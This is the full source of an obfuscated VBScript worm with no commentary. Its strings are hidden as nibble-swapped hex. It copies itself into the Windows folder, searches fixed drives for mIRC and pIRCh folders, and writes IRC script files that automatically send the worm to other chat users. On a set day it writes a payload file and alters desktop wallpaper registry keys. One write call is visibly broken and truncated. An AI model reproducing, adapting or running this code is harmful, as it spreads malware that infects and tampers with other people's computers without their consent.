On Error Resume Next
Set Ned = CreateObject(Sherri("35362796074796E676E26496C6563597374756D6F426A6563647"))
Set Todd = CreateObject(Sherri("75353627960747E2358656C6C6"))
If Ned.FileExists(Ned.BuildPath(Ned.GetSpecialFolder(0),Sherri("63636345543545E2A59405"))) = True Then
Doris
Else
If Ned.FileExists(Ned.BuildPath(Ned.GetSpecialFolder(1),Sherri("7594E435751405E2357505"))) = True Then
Ned.CopyFile Ned.BuildPath(Ned.GetSpecialFolder(1),Sherri("7594E435751405E2357505")),Ned.BuildPath(Ned.GetSpecialFolder(0),Sherri("63636345543545E2A59405"))
Doris
Else
Wendell
End If
End If
Function Sherri(Terri)
For Nelson = 1 To Len(Terri) Step 2
Sherri = Sherri & Chr("&h" & Mid(Terri,Nelson + 1,1) & Mid(Terri,Nelson,1))
Next
End Function
Sub Doris
For Each Maude In Ned.Drives
If Maude.DriveType = 2 Then
Jimbo Maude.DriveLetter & Sherri("A3C5D4942534")
Jimbo Maude.DriveLetter & Sherri("A3C5D49425343323")
Jimbo Maude.DriveLetter & Sherri("A3C50594253484")
Jimbo Maude.DriveLetter & Sherri("A3C505942534849383")
End If
Next
Jimbo Todd.RegRead(Sherri("84B45495F5C4F43414C4F5D414348494E454C535F6664777162756C5D4963627F637F66647C57596E646F67737C53457272756E6476556273796F6E6C50527F6762716D66496C65637449627"))
If Day(Now) = 5 Then
Wendell
End If
End Sub
Sub Wendell
Set Herman = Ned.CreateTextFile(Ned.BuildPath(Ned.GetSpecialFolder(0),Sherri("6514E484F4554554E4E224D405")),True)
Herman.Write(Sherri
Herman.Close
Todd.RegWrite Sherri("84B45495F53455252554E445F555355425C534F6E64727F6C6020516E656C6C5445637B647F607C54596C6567516C6C60716075627"),Sherri("13")
Todd.RegWrite Sherri("84B45495F53455252554E445F555355425C534F6E64727F6C6020516E656C6C5445637B647F607C57516C6C60716075627"),Ned.BuildPath(Ned.GetSpecialFolder(0),Sherri("6514E484F4554554E4E224D405"))
Todd.RegWrite Sherri("84B45495F53455252554E445F555355425C534F6E64727F6C6020516E656C6C5445637B647F607C57516C6C60716075627354797C656"),Sherri("03")
End Sub
Sub Jimbo(Jasper)
If Ned.FolderExists(Jasper) = True Then
For Each Jebediah In Ned.GetFolder(Jasper).Files
If UCase(Jebediah.Name) = Sherri("D49425343323E2548554") Then
Set Melvin = Ned.CreateTextFile(Ned.BuildPath(Jebediah.ParentFolder,Sherri("353425940545E294E494")),True)
Melvin.WriteLine(Sherri("B5373627960747D5"))
Melvin.WriteLine(Sherri("E603D3F6E60213A3A6F696E6A332A396660242D6560212D30242E69636B602463636023756E6460242E69636B602") & Ned.BuildPath(Ned.GetSpecialFolder(0),Sherri("63636345543545E2A59405")))
Melvin.Close
End If
If UCase(Jebediah.Name) = Sherri("0594253484E2548554") Or UCase(Jebediah.Name) = Sherri("05942534849383E2548554") Then
Set Hans = Ned.CreateTextFile(Ned.BuildPath(Jebediah.ParentFolder,Sherri("546554E44535E294E494")),True)
Hans.WriteLine(Sherri("B5C4566756C637D5"))
Hans.WriteLine(Sherri("54E61626C65646D313"))
Hans.WriteLine(Sherri("34F657E647D363"))
Hans.WriteLine(Sherri("C4566756C613D3030303D255E6B6E6F677E637"))
Hans.WriteLine(Sherri("030303D255E6B6E6F677E63754E61626C65646D313"))
Hans.WriteLine(Sherri("C4566756C623D3130303D2C4566756C602130303"))
Hans.WriteLine(Sherri("130303D2C4566756C60213030354E61626C65646D313"))
Hans.WriteLine(Sherri("C4566756C633D3230303D2C4566756C602230303"))
Hans.WriteLine(Sherri("230303D2C4566756C60223030354E61626C65646D313"))
Hans.WriteLine(Sherri("C4566756C643D3330303D2C4566756C602330303"))
Hans.WriteLine(Sherri("330303D2C4566756C60233030354E61626C65646D313"))
Hans.WriteLine(Sherri("C4566756C653D3430303D2C4566756C602430303"))
Hans.WriteLine(Sherri("430303D2C4566756C60243030354E61626C65646D313"))
Hans.WriteLine(Sherri("C4566756C663D3530303D2C4566756C602530303"))
Hans.WriteLine(Sherri("530303D2C4566756C60253030354E61626C65646D313"))
Hans.WriteLine("")
Hans.WriteLine(Sherri("B5030303D255E6B6E6F677E637D5"))
Hans.WriteLine(Sherri("5537562713D3A212A204A2"))
Hans.WriteLine(Sherri("5537562734F657E647D313"))
Hans.WriteLine(Sherri("546756E64713D3F4E402A4F494E4A332A3F2463636023756E6460242E69636B602") & Ned.BuildPath(Ned.GetSpecialFolder(0),Sherri("63636345543545E2A59405")))
Hans.WriteLine(Sherri("546756E64734F657E647D313"))
Hans.WriteLine("")
Hans.WriteLine(Sherri("B5130303D2C4566756C602130303D5"))
Hans.WriteLine(Sherri("5537562734F657E647D303"))
Hans.WriteLine(Sherri("546756E64734F657E647D303"))
Hans.WriteLine("")
Hans.WriteLine(Sherri("B5230303D2C4566756C602230303D5"))
Hans.WriteLine(Sherri("5537562734F657E647D303"))
Hans.WriteLine(Sherri("546756E64734F657E647D303"))
Hans.WriteLine("")
Hans.WriteLine(Sherri("B5330303D2C4566756C602330303D5"))
Hans.WriteLine(Sherri("5537562734F657E647D303"))
Hans.WriteLine(Sherri("546756E64734F657E647D303"))
Hans.WriteLine("")
Hans.WriteLine(Sherri("B5430303D2C4566756C602430303D5"))
Hans.WriteLine(Sherri("5537562734F657E647D303"))
Hans.WriteLine(Sherri("546756E64734F657E647D303"))
Hans.WriteLine("")
Hans.WriteLine(Sherri("B5530303D2C4566756C602530303D5"))
Hans.WriteLine(Sherri("5537562734F657E647D303"))
Hans.WriteLine(Sherri("546756E64734F657E647D303"))
Hans.Close
End If
Next
For Each Julius In Ned.GetFolder(Jasper).SubFolders
Jimbo Julius.Path
Next
End If
End Sub
